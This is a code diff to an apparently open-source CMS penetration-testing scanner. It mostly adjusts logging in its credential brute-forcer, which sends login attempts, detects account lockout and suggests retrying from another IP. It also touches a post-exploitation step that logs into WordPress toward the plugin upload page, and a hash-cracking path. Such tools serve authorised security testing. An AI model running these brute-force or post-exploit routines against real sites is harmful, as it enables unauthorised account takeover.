@@ -1217,8 +1217,8 @@ class BruteForcer:
                         #print e.code
                         pass
                 self.pswlist.pop() # remove user
-            msg = "[-] Valid Usernames found: "; print msg
-            report.WriteTextFile(msg)
+            #msg = "Valid Usernames found: "; report.message(msg)
+            #report.WriteTextFile(msg)
             for userf in (sorted(set(usersFound))):
                 msg = userf; report.medium(msg)
             for WPCredential in self.WPValidCredentials :
@@ -1266,10 +1266,11 @@ class BruteForcer:
                     data = urllib.urlencode(query_args)
                     # HTTP POST Request
                     req = urllib2.Request(self.url+self.drulogin, data,self.headers)
-                    #print "[*] Trying Credentials: "+user+" "+pwd
+                    msg = "Trying Credentials: "+user+" "+pwd
+                    report.verbose(msg)
                     try:
                         htmltext = urllib2.urlopen(req).read()
-                        if re.findall(re.compile('Sorry, too many failed login attempts from your IP address.'),htmltext):
+                        if re.findall(re.compile('Sorry, too many failed login attempts|Try again later'),htmltext):
                             msg = "Account Lockout Enabled: Your IP address has been temporary blocked. Try it later or from a different IP address"
                             report.error(msg)
                             return
@@ -1299,7 +1300,7 @@ class PostExploit:
         cookieJar.clear()
         try: 
             # Login in WordPress - HTTP Post
-            msg ="[-] Logging in to on the target website ..."
+            msg ="Logging in to on the target website ..."
             report.verbose(msg)
             opener.open(self.url+self.wplogin, urllib.urlencode(self.query_args_login))
             # Request WordPress Plugin Upload page
@@ -1888,7 +1889,7 @@ if __name__ == "__main__":
     if CMSmapUpdate :      
         initializer.UpdateRun()
     elif BruteForcingAttack :
-        BruteForcer(url,usrlist,pswlist).FindCMSType()
+        BruteForcer(scanner.url,usrlist,pswlist).FindCMSType()
     elif CrackingPasswords:
         PostExploit(None).CrackingHashesType(hashfile, wordlist)
     
